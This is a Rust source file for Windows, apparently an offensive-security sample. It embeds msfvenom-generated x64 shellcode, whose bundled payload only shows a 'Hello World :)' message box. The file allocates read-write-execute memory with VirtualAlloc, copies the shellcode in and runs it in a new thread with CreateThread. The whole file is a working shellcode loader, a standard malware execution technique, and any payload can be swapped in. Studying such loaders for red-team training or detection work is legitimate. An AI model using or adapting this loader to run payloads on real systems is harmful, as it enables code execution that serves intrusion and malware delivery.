use std::ptr;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::FormatMessageW;
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

#[allow(dead_code)]
unsafe fn print_error() {
    let err = GetLastError();

    let mut buffer: [u16; 256] = [0; 256];
    let _ = FormatMessageW(
        0x00001000,
        ptr::null_mut(),
        err,
        0,
        buffer.as_mut_ptr(),
        buffer.len().try_into().unwrap(),
        ptr::null_mut(),
    );

    let message = String::from_utf16(&buffer).unwrap();
    println!("{}", message);
}

fn main() {
    // msfvenom -p windows/x64/messagebox TEXT="Hello World :)" -f rust
    let shellcode: [u8; 320] = [
        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48,
        0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48,
        0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
        0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e,
        0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88,
        0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48,
        0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
        0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41,
        0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24,
        0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
        0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41,
        0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x3e, 0x48, 0x8d,
        0x8d, 0x28, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x49, 0xc7,
        0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00, 0x00, 0x3e, 0x4c,
        0x8d, 0x85, 0x1d, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07,
        0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x65,
        0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x20, 0x3a, 0x29, 0x00, 0x4d, 0x65,
        0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32,
        0x2e, 0x64, 0x6c, 0x6c, 0x00,
    ];

    unsafe {
        let size_shellcode = shellcode.len().try_into().unwrap();

        let base_addr = VirtualAlloc(
            ptr::null_mut(),
            size_shellcode,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        if base_addr.is_null() {
            println!("[-] Couldn't allocate memory to current proc.")
        } else {
            println!("[+] Allocated memory to current proc.");
        }

        // copy shellcode into mem
        println!("[*] Copying Shellcode to address in current proc.");
        std::ptr::copy(
            shellcode.as_ptr(),
            base_addr as *mut u8,
            size_shellcode as usize,
        );
        println!("[*] Copied...");

        // Execute shellcode
        println!("[*] Executing Shellcode...");
        let thread_handle = CreateThread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(base_addr)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        if thread_handle.is_null() {
            println!("[-] Couldn't execute shellcode.");
        } else {
            println!("[+] Shellcode executed.");
        }

        // wait for thread to finish
        WaitForSingleObject(thread_handle, 0xFFFFFFFF);

        println!("[*] Thread finished.");

        VirtualFree(std::mem::transmute(base_addr), 0, MEM_RELEASE);

        println!("[*] Memory freed.");

        CloseHandle(thread_handle);
    }
}
